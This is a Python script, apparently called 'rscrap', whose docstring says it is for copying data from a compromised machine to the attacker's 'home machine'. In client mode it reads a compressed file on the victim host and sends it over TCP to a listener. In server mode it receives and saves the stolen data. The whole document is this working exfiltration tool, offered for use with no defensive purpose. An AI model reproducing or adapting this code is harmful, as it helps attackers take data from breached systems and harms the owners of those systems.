#!/usr/bin/python

'''
you are expected to use rscrap(reverse scrap) script as client/server, in case you don't know the ip of the shell, and you need to copy data from the compromized machine to the home machine.
'''

import socket
import sys
import time
import gzip
from threading import Thread
from argparse import ArgumentParser

INT_LEN=4
ENDIAN='little'

class ScrapServer(Thread):
    def __init__(self, path, addr, port, sock):
        Thread.__init__(self)
        self.f=gzip.open(path, 'w')
        self.addr=addr
        self.port=port
        self.socket=sock
        
    def run(self):
        #TODO (fix) i remove host from path because host
        # name might include back-slash.
        # payload=''
        try:
            num=self.socket.recv(4, socket.MSG_DONTWAIT)
            num=int.from_bytes(num, ENDIAN)
            print("file size being received: ", num)
            # why does the recv fails to read sufficient data,
            # perhaps there are limitations over it's size.
            # i should try to read several times.
            # also check send, doesn't it send all the payload?!
            size_read=0
            pack=[]
            pack_len=4096
            while size_read < num:
                if num-size_read < pack_len:
                    pack_len=num-size_read
                payload=self.socket.recv(pack_len)
                pack.append(payload)
                payload_len=len(payload)
                size_read+=payload_len
            print("harnest pack of payload of len: ", len(pack))
            for payload in pack:
                self.f.write(payload)
        except Exception as e:
            print("recv error: ", e.__class__)
            print("recv error: ", e)
        self.socket.close()        
        self.f.close()
        
def init_server(path, host, port):
    # bind the socket
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #TODO (res) bind on ip
    s.bind(('', port))
    threads = []
    def listen_run():
        s.listen(1)
        sock, addr=s.accept()
        thread=ScrapServer(path, addr[0],addr[1], sock)
        thread.start()
        threads.append(thread)
    def finalise():
        for t in threads:
            t.join()
        s.close()
    while True:
        try:
            listen_run()
        except Exception as e:
            print("send failed!: ", e.__class__)
            print(e)
        except KeyboardInterrupt:
            print("exiting...")
            break
    finalise()

def init_client(path, host, port):
    # read payload
    #TODO (fix) send it compressed
    f = gzip.open(path, 'rb')
    raw = f.read()
    f.close()
    braw = raw
    #bytes(raw, encoding='utf-8')
    raw_len=len(braw)
    # bind the socket
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #TODO (res) bind on ip
    s.connect((host, port))
    #TODO (fix) this
    s.send(raw_len.to_bytes(INT_LEN, ENDIAN))
    s.send(braw)
    s.close()

parser=ArgumentParser()
parser.add_argument('-p', '--port', default=54321, type=int, help="set server port")
parser.add_argument('-i', '--infile', default='/tmp/scrap.tar.gz', type=str, help='path to file to transfer')
parser.add_argument('-o', '--outfile', default='/tmp/out', type=str, help='path to file to transfer')
parser.add_argument('-t', '--etype', default='s', type=str, help="choose weither to run it as server/client")
parser.add_argument('-a', '--addr', default=socket.gethostname(), type=str, help="the client/server address")
args = parser.parse_args()
host = args.addr
port = args.port
inpath = args.infile
outpath = args.outfile
execution = args.etype

if execution=='s':
    init_server(outpath, host, port)
elif execution=='c':
    init_client(inpath, host, port)
